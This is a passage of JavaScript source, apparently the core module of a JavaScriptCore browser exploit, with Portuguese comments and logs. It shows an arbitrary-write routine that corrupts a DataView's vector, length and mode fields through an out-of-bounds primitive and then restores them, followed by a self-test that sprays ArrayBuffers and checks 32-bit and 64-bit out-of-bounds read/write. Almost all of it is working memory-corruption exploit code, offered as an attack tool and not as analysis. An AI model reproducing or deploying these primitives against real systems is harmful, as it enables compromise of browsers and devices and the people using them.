        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para writeArbitrary deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para writeArbitrary não é AdvancedInt64 válido.`);
        }
    }

    try {
        const oob_dataview_real_addr = getAddress(oobDataViewGlobal);
        m_vector_orig_snap = kernelMemory.read64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET));
        m_length_orig_snap = kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET));
        m_mode_orig_snap = kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET));

        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS (via kernelMemory): m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, "debug");

        kernelMemory.write64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), addr64);
        kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET), 0xFFFFFFFF);
        kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET), JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0]);

        log(`[${FNAME}] DEBUG: DataView CORROMPIDO (via kernelMemory): m_vector=${toHexHelper(kernelMemory.read64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET)))}, m_length=${toHex(kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET)))}, m_mode=${toHex(kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET)))}.`, "debug");

        log(`[${FNAME}] DEBUG: Realizando escrita arbitrária em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}).`, "debug");
        let val64_write;
        switch (byteLength) {
            case 1: oobDataViewGlobal.setUint8(0, Number(value)); break;
            case 2: oobDataViewGlobal.setUint16(0, Number(value), true); break;
            case 4: oobDataViewGlobal.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                if (!isAdvancedInt64Object(val64_write)) {
                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
                }
                log(`[${FNAME}] DEBUG 64bit Write: offset=${toHex(0)}, value=${toHexHelper(val64_write)}`, "debug");
                oobDataViewGlobal.setUint32(0, val64_write.low(), true);
                log(`[${FNAME}] DEBUG 64bit Write: low part written. Value at offset ${toHex(0)}: ${toHex(oobDataViewGlobal.getUint32(0, true))}`, "debug");
                oobDataViewGlobal.setUint32(4, val64_write.high(), true);
                log(`[${FNAME}] DEBUG 64bit Write: high part written. Value at offset ${toHex(4)}: ${toHex(oobDataViewGlobal.getUint32(4, true))}`, "debug");
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para writeOOBAbsolute: ${byteLength}`, "error", FNAME);
                throw new Error(`Invalid byteLength for writeOOBAbsolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao escrever em oob_buffer[${toHex(0)}]: ${e.message}`, "critical", FNAME);
        isOOBEnvironmentInitialized = false;
        throw e;
    } finally {
        // === Restauração dos Metadados do DataView ===
        if (isOOBReady() && oobDataViewGlobal) {
            log(`[${FNAME}] DEBUG: Restauração de metadados originais do DataView após escrita.`, "debug");
            try {
                const oob_dataview_real_addr = getAddress(oobDataViewGlobal);
                kernelMemory.write64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), m_vector_orig_snap); 
                kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET), m_length_orig_snap);
                kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET), m_mode_orig_snap);
                await _resetDVAfterArbitraryOperation(FNAME);
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, "debug");
            } catch (eR) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, "critical");
                isOOBEnvironmentInitialized = false;
            }
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, "critical");
        }
    }
}


export function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.22 - com re-inicialização forçada e validação de m_mode) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;

    let local_oob_refs = []; 

    try {
        currentLog(`    (Setup) Chamando setupOOBPrimitive...`, 'info', FNAME_TEST);
        setupOOBPrimitive({ force_reinit: true });

        for (let i = 0; i < 100; i++) {
            local_oob_refs.push(new ArrayBuffer(getOOBAllocationSize()));
        }
        try {
            if (oobArrayBufferGlobal && oobArrayBufferGlobal.byteLength > 0) {
                const tempUint8View = new Uint8Array(oobArrayBufferGlobal);
                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
                    tempUint8View[i] = i % 255;
                    tempUint8View[i+1] = (i+1) % 255;
                    tempUint8View[i+2] = (i+2) % 255;
                    tempUint8View[i+3] = (i+3) % 255;
                    tempUint8View[i+4] = (i+4) % 255;
                    tempUint8View[i+5] = (i+5) % 255;
                    tempUint8View[i+6] = (i+6) % 255;
                    tempUint8View[i+7] = (i+7) % 255;
                }
                 for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
                    let val = tempUint8View[i];
                 }
                currentLog(`[${FNAME_TEST}] oobArrayBufferGlobal aquecido/pinado com sucesso.`, "good");
            }
        } catch (e) {
            currentLog(`[${FNAME_TEST}] ALERTA: Erro durante o aquecimento/pinning do oobArrayBufferGlobal: ${e.message}`, "warn");
        }
        
        if (!isOOBReady()) {
            currentLog(`    (Setup) FALHA CRÍTICA: Ambiente OOB não pôde ser inicializado para auto-teste.`, "critical", FNAME_TEST);
            return false;
        }
        currentLog(`    (Setup) Ambiente OOB pronto para teste.`, "good", FNAME_TEST);

        const test_offset = 0x50;
        if (test_offset + 8 > oobArrayBufferGlobal.byteLength) { 
             currentLog(`    (Setup) ERRO: Offset de teste (${toHex(test_offset)}) está fora dos limites do oobArrayBufferGlobal (${oobArrayBufferGlobal.byteLength}).`, "critical", FNAME_TEST);
             throw new Error("Offset de teste fora dos limites.");
        }

        const test_val32 = 0x11223344;
        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em offset absoluto ${toHex(test_offset)} do oobArrayBufferGlobal`, "debug", FNAME_TEST);
        writeOOBAbsolute(test_offset, test_val32, 4);
        const read_val32 = readOOBAbsolute(test_offset, 4);
        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de offset absoluto ${toHex(test_offset)}`, "debug", FNAME_TEST);

        if (read_val32 === test_val32) {
            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_offset + 16;
        if (next_offset + 8 > oobArrayBufferGlobal.byteLength) {
            currentLog(`    (64bit Test) ERRO: Offset ${toHex(next_offset)} fora dos limites do buffer (${oobArrayBufferGlobal.byteLength})`, "critical", FNAME_TEST);
            throw new Error("Offset para teste 64bit fora dos limites");
        }
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    (64bit Test) Escrevendo (test_val64): ${toHexHelper(test_val64)} em offset absoluto ${toHex(next_offset)} do oobArrayBufferGlobal`, "debug", FNAME_TEST);
        writeOOBAbsolute(next_offset, test_val64, 8);

        const read_val64 = readOOBAbsolute(next_offset, 8);
        currentLog(`    (64bit Test) Lido de offset absoluto ${toHex(next_offset)}. Tipo retornado: object.`, "debug", FNAME_TEST);

        if (isAdvancedInt64Object(read_val64)) {
            currentLog(`    (64bit Test) Verificação local de tipo: OK. Valor lido (read_val64): ${toHexHelper(read_val64)}`, "debug", FNAME_TEST);
            if (read_val64.low() === test_val64.low() && read_val64.high() === test_val64.high()) {
                currentLog(`    (64bit Test) SUCESSO: Lido ${toHexHelper(read_val64)} (low/high) corretamente.`, "good", FNAME_TEST);
                success64 = true;
            } else {
                currentLog(`    (64bit Test) FALHA: Componentes low/high não correspondem. Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
                currentLog(`        Lido  : low=0x${read_val64.low().toString(16)}, high=0x${read_val64.high().toString(16)}`, "error", FNAME_TEST);
                currentLog(`        Esperado: low=0x${test_val64.low().toString(16)}, high=0x${test_val64.high().toString(16)}`, "error", FNAME_TEST);
            }
        } else {
            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é reconhecido como um objeto AdvancedInt64 pela verificação local. Construtor: ${read_val64?.constructor?.name}. Valor: ${String(read_val64)} Esperado: ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
        }

        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, "test", FNAME_TEST);
        return success32 && success64;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, "critical", FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        isOOBEnvironmentInitialized = false;
        return false;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        local_oob_refs = []; 
        currentLog(`    (Cleanup) Ambiente OOB limpo após self-test.`, 'info', FNAME_TEST);
    }
}


export function getOOBDataView() {
    return oobDataViewGlobal;
}
